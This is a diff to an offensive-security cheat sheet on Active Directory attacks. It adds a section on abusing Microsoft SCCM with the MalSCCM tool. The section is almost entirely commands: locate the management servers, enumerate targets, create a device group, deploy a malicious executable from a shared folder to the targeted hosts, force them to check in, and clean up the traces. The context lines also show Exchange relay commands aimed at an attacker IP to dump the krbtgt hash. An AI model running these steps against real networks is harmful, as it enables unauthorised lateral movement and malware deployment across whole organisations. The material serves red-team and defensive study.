@@ -105,6 +105,7 @@
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
     - [PrivExchange attack](#privexchange-attack)
+    - [SCCM Deployment](#sccm-deployment)
     - [RODC - Read Only Domain Controller Compromise](#rodc---read-only-domain-controller-compromise)
     - [PXE Boot image attack](#pxe-boot-image-attack)
     - [DSRM Credentials](#dsrm-credentials)
@@ -3238,6 +3239,63 @@ python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d 
 python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
 ```
 
+### SCCM Deployment
+
+> SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.
+
+* [PowerSCCM - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)
+* [MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage](https://github.com/nettitude/MalSCCM)
+
+* Compromise client, use locate to find management server 
+    ```ps1
+    MalSCCM.exe locate
+    ```
+* Enumerate over WMI as an administrator of the Distribution Point
+    ```ps1
+    MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
+    ```
+* Compromise management server, use locate to find primary server
+* use Inspect on primary server to view who you can target
+    ```ps1
+    MalSCCM.exe inspect /all
+    MalSCCM.exe inspect /computers
+    MalSCCM.exe inspect /primaryusers
+    MalSCCM.exe inspect /groups
+    ```
+* Create a new device group for the machines you want to laterally move too
+    ```ps1
+    MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
+    MalSCCM.exe inspect /groups
+    ```
+
+* Add your targets into the new group 
+    ```ps1
+    MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
+    ```
+* Create an application pointing to a malicious EXE on a world readable share : `SCCMContentLib$`
+    ```ps1
+    MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
+    MalSCCM.exe inspect /applications
+    ```
+
+* Deploy the application to the target group 
+    ```ps1
+    MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
+    MalSCCM.exe inspect /deployments
+    ```
+* Force the target group to checkin for updates 
+    ```ps1
+    MalSCCM.exe checkin /groupname:TargetGroup
+    ```
+
+* Cleanup the application, deployment and group
+    ```ps1
+    MalSCCM.exe app /cleanup /name:demoapp
+    MalSCCM.exe group /delete /groupname:TargetGroup
+    ```
+
+
+
 ### RODC - Read Only Domain Controller Compromise
 
 > If the user is included in the **Allowed RODC Password Replication**, their credentials are stored in the server, and the **msDS-RevealedList** attribute of the RODC is populated with the username.
@@ -3586,3 +3644,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
 * [AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh](https://www.blackarrow.net/ad-cs-from-manageca-to-rce/)
 * [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
+* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
